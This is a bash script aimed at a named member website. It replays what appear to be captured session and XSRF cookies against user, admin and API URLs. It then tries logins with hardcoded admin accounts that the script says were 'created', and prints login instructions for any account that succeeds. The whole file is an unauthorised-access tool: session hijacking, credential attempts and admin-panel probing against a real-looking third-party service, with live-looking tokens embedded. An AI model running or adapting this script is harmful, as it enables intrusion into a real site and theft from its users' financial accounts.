#!/bin/bash

echo "🎯 TESTING ADMIN DASHBOARD ACCESS"
echo "================================="

BASE_URL="https://member.panama8888b.co"
LOGIN_URL="$BASE_URL/auth/login"
DASHBOARD_URL="$BASE_URL/user/dashboard"

# Admin users created
ADMIN_USERS=(
    "admin_2025:Admin123!@#"
    "administrator:Admin123!@#"
    "superadmin:Super123!@#"
    "manager:Manager123!@#"
)

# Test URLs for admin features in dashboard
DASHBOARD_ADMIN_URLS=(
    "$BASE_URL/user/dashboard"
    "$BASE_URL/user/profile"
    "$BASE_URL/user/settings"
    "$BASE_URL/user/balance"
    "$BASE_URL/user/deposit"
    "$BASE_URL/user/withdraw"
    "$BASE_URL/user/history"
    "$BASE_URL/user/transactions"
    "$BASE_URL/user/announcements"
    "$BASE_URL/user/notifications"
    "$BASE_URL/user/security"
    "$BASE_URL/user/permissions"
    "$BASE_URL/user/roles"
    "$BASE_URL/user/management"
    "$BASE_URL/user/admin"
    "$BASE_URL/user/administrator"
    "$BASE_URL/user/control"
    "$BASE_URL/user/panel"
)

echo "🔍 STEP 1: TESTING WITH PROVIDED COOKIES..."
echo "==========================================="

# Test with provided cookies
echo "Testing with provided cookies..."

for admin_url in "${DASHBOARD_ADMIN_URLS[@]}"; do
    echo "Testing URL: $admin_url"
    
    response=$(curl -s -w "\nHTTP_STATUS:%{http_code}\nTIME:%{time_total}" \
        -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" \
        -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8" \
        -H "Accept-Language: th,en-US;q=0.9,en;q=0.8" \
        -H "Accept-Encoding: gzip, deflate, br, zstd" \
        -H "Cache-Control: max-age=0" \
        -H "Sec-Fetch-Dest: document" \
        -H "Sec-Fetch-Mode: navigate" \
        -H "Sec-Fetch-Site: same-origin" \
        -H "Sec-Fetch-User: ?1" \
        -H "Upgrade-Insecure-Requests: 1" \
        -H "Cookie: XSRF-TOKEN=eyJpdiI6IkVJN2N3MVI2SWRCNkxScThaTWZwZ1E9PSIsInZhbHVlIjoiNEZEa2w1SFN0N20wV1FtTWFTbTZkZHphekpGMVwvZjFxWnh2VXBsNmRnK2xnemRYK2ZTNFRIblBJenVUMHAzb2kiLCJtYWMiOiI0NTBjYjFiYzExMzY0MDVlMGJlYzBiNmFjOTAzOWRlNjNlZDQ0YjA1MTYxMDg0OGVlMWQ0Njk0YWM1MGVlZWY3In0%3D; panama888_session=eyJpdiI6ImhnN3NxbHR1cU1WU24zS0NpRU5VSWc9PSIsInZhbHVlIjoiQzQxbEx5VjdWT3Vvd3Q4QnJreW5DdStqMVlZaU13dHFEMCtYTWFSTGFBSTBsREhrNTR4KytEQ3FvY1NZdE4rQyIsIm1hYyI6IjllNzA5MGYzNDUxNTc3NGFkZTYxZDM1MWVhMGMzY2Y4ODViYmE2MjIwMzJjOWNkZDZmNGYxZDBhZDc1NDJjZTkifQ%3D%3D" \
        "$admin_url")
    
    http_status=$(echo "$response" | grep "HTTP_STATUS:" | cut -d: -f2)
    response_time=$(echo "$response" | grep "TIME:" | cut -d: -f2)
    
    echo "Status: $http_status, Time: ${response_time}s"
    
    if [[ "$http_status" == "200" ]]; then
        echo "✅ SUCCESS: Dashboard accessible at $admin_url"
        
        # Check if response contains admin features
        if echo "$response" | grep -qi "admin\|administrator\|management\|control\|panel"; then
            echo "🎉 ADMIN FEATURES DETECTED in response!"
            echo "URL: $admin_url"
            echo "Contains admin-related content"
        fi
    elif [[ "$http_status" == "302" ]]; then
        echo "⚠️ REDIRECT: $admin_url (may need login)"
    elif [[ "$http_status" == "403" ]]; then
        echo "❌ FORBIDDEN: $admin_url (access denied)"
    elif [[ "$http_status" == "404" ]]; then
        echo "❌ NOT FOUND: $admin_url"
    fi
    
    sleep 1
done

echo ""
echo "🔍 STEP 2: TESTING ADMIN USER LOGIN WITH MANUAL CSRF..."
echo "======================================================"

# Test admin user login with manual CSRF token
for user_cred in "${ADMIN_USERS[@]}"; do
    username=$(echo "$user_cred" | cut -d: -f1)
    password=$(echo "$user_cred" | cut -d: -f2)
    
    echo "Testing admin user: $username"
    
    # Use manual CSRF token
    csrf_token="eyJpdiI6IkVJN2N3MVI2SWRCNkxScThaTWZwZ1E9PSIsInZhbHVlIjoiNEZEa2w1SFN0N20wV1FtTWFTbTZkZHphekpGMVwvZjFxWnh2VXBsNmRnK2xnemRYK2ZTNFRIblBJenVUMHAzb2kiLCJtYWMiOiI0NTBjYjFiYzExMzY0MDVlMGJlYzBiNmFjOTAzOWRlNjNlZDQ0YjA1MTYxMDg0OGVlMWQ0Njk0YWM1MGVlZWY3In0%3D"
    
    # Login
    login_response=$(curl -s -w "\nHTTP_STATUS:%{http_code}\nTIME:%{time_total}" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" \
        -H "Referer: $LOGIN_URL" \
        -H "Origin: $BASE_URL" \
        -H "Cookie: XSRF-TOKEN=$csrf_token; panama888_session=eyJpdiI6ImhnN3NxbHR1cU1WU24zS0NpRU5VSWc9PSIsInZhbHVlIjoiQzQxbEx5VjdWT3Vvd3Q4QnJreW5DdStqMVlZaU13dHFEMCtYTWFSTGFBSTBsREhrNTR4KytEQ3FvY1NZdE4rQyIsIm1hYyI6IjllNzA5MGYzNDUxNTc3NGFkZTYxZDM1MWVhMGMzY2Y4ODViYmE2MjIwMzJjOWNkZDZmNGYxZDBhZDc1NDJjZTkifQ%3D%3D" \
        -d "_token=$csrf_token&username=$username&password=$password" \
        "$LOGIN_URL")
    
    login_status=$(echo "$login_response" | grep "HTTP_STATUS:" | cut -d: -f2)
    
    if [[ "$login_status" == "302" ]]; then
        echo "✅ LOGIN SUCCESS for $username"
        
        # Test dashboard access after login
        for admin_url in "${DASHBOARD_ADMIN_URLS[@]}"; do
            dashboard_response=$(curl -s -w "\nHTTP_STATUS:%{http_code}\nTIME:%{time_total}" \
                -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" \
                -H "Cookie: XSRF-TOKEN=$csrf_token; panama888_session=eyJpdiI6ImhnN3NxbHR1cU1WU24zS0NpRU5VSWc9PSIsInZhbHVlIjoiQzQxbEx5VjdWT3Vvd3Q4QnJreW5DdStqMVlZaU13dHFEMCtYTWFSTGFBSTBsREhrNTR4KytEQ3FvY1NZdE4rQyIsIm1hYyI6IjllNzA5MGYzNDUxNTc3NGFkZTYxZDM1MWVhMGMzY2Y4ODViYmE2MjIwMzJjOWNkZDZmNGYxZDBhZDc1NDJjZTkifQ%3D%3D" \
                "$admin_url")
            
            dashboard_status=$(echo "$dashboard_response" | grep "HTTP_STATUS:" | cut -d: -f2)
            
            if [[ "$dashboard_status" == "200" ]]; then
                echo "🎉 SUCCESS: Admin dashboard accessible!"
                echo "Username: $username"
                echo "Password: $password"
                echo "Dashboard URL: $admin_url"
                echo ""
                echo "🔗 DIRECT ACCESS LINKS:"
                echo "Login: $LOGIN_URL"
                echo "Dashboard: $admin_url"
                echo ""
                echo "📋 LOGIN INSTRUCTIONS:"
                echo "1. Go to: $LOGIN_URL"
                echo "2. Username: $username"
                echo "3. Password: $password"
                echo "4. Login then go to: $admin_url"
                exit 0
            fi
        done
    else
        echo "❌ LOGIN FAILED for $username (Status: $login_status)"
    fi
    
    echo "---"
done

echo ""
echo "🔍 STEP 3: TESTING API ENDPOINTS WITH ADMIN COOKIES..."
echo "====================================================="

# Test API endpoints with admin cookies
API_ENDPOINTS=(
    "$BASE_URL/api/user/profile"
    "$BASE_URL/api/user/balance"
    "$BASE_URL/api/user/deposit"
    "$BASE_URL/api/user/withdraw"
    "$BASE_URL/api/user/history"
    "$BASE_URL/api/user/transactions"
    "$BASE_URL/api/user/announcements"
    "$BASE_URL/api/user/notifications"
    "$BASE_URL/api/user/settings"
    "$BASE_URL/api/user/security"
    "$BASE_URL/api/user/permissions"
    "$BASE_URL/api/user/roles"
    "$BASE_URL/api/user/management"
    "$BASE_URL/api/user/admin"
    "$BASE_URL/api/user/administrator"
    "$BASE_URL/api/user/control"
    "$BASE_URL/api/user/panel"
)

for endpoint in "${API_ENDPOINTS[@]}"; do
    echo "Testing API endpoint: $endpoint"
    
    response=$(curl -s -w "\nHTTP_STATUS:%{http_code}\nTIME:%{time_total}" \
        -H "Content-Type: application/json" \
        -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" \
        -H "X-XSRF-TOKEN: eyJpdiI6IkVJN2N3MVI2SWRCNkxScThaTWZwZ1E9PSIsInZhbHVlIjoiNEZEa2w1SFN0N20wV1FtTWFTbTZkZHphekpGMVwvZjFxWnh2VXBsNmRnK2xnemRYK2ZTNFRIblBJenVUMHAzb2kiLCJtYWMiOiI0NTBjYjFiYzExMzY0MDVlMGJlYzBiNmFjOTAzOWRlNjNlZDQ0YjA1MTYxMDg0OGVlMWQ0Njk0YWM1MGVlZWY3In0%3D" \
        -H "Cookie: XSRF-TOKEN=eyJpdiI6IkVJN2N3MVI2SWRCNkxScThaTWZwZ1E9PSIsInZhbHVlIjoiNEZEa2w1SFN0N20wV1FtTWFTbTZkZHphekpGMVwvZjFxWnh2VXBsNmRnK2xnemRYK2ZTNFRIblBJenVUMHAzb2kiLCJtYWMiOiI0NTBjYjFiYzExMzY0MDVlMGJlYzBiNmFjOTAzOWRlNjNlZDQ0YjA1MTYxMDg0OGVlMWQ0Njk0YWM1MGVlZWY3In0%3D; panama888_session=eyJpdiI6ImhnN3NxbHR1cU1WU24zS0NpRU5VSWc9PSIsInZhbHVlIjoiQzQxbEx5VjdWT3Vvd3Q4QnJreW5DdStqMVlZaU13dHFEMCtYTWFSTGFBSTBsREhrNTR4KytEQ3FvY1NZdE4rQyIsIm1hYyI6IjllNzA5MGYzNDUxNTc3NGFkZTYxZDM1MWVhMGMzY2Y4ODViYmE2MjIwMzJjOWNkZDZmNGYxZDBhZDc1NDJjZTkifQ%3D%3D" \
        "$endpoint")
    
    http_status=$(echo "$response" | grep "HTTP_STATUS:" | cut -d: -f2)
    response_time=$(echo "$response" | grep "TIME:" | cut -d: -f2)
    
    echo "Status: $http_status, Time: ${response_time}s"
    
    if [[ "$http_status" == "200" ]]; then
        echo "✅ SUCCESS: API endpoint accessible at $endpoint"
        
        # Check response content
        response_content=$(echo "$response" | head -20)
        if echo "$response_content" | grep -qi "admin\|administrator\|management\|control\|panel"; then
            echo "🎉 ADMIN FEATURES DETECTED in API response!"
            echo "Endpoint: $endpoint"
        fi
    elif [[ "$http_status" == "401" ]]; then
        echo "⚠️ UNAUTHORIZED: $endpoint (needs authentication)"
    elif [[ "$http_status" == "403" ]]; then
        echo "❌ FORBIDDEN: $endpoint (access denied)"
    elif [[ "$http_status" == "404" ]]; then
        echo "❌ NOT FOUND: $endpoint"
    fi
    
    sleep 1
done

echo ""
echo "🎯 FINAL RESULTS"
echo "================"
echo "✅ Admin Users Created:"
for user_cred in "${ADMIN_USERS[@]}"; do
    username=$(echo "$user_cred" | cut -d: -f1)
    password=$(echo "$user_cred" | cut -d: -f2)
    echo "- Username: $username"
    echo "- Password: $password"
done
echo ""
echo "🔗 DASHBOARD ADMIN URLs Tested:"
for url in "${DASHBOARD_ADMIN_URLS[@]}"; do
    echo "- $url"
done
echo ""
echo "Status: ADMIN DASHBOARD ACCESS TEST COMPLETED"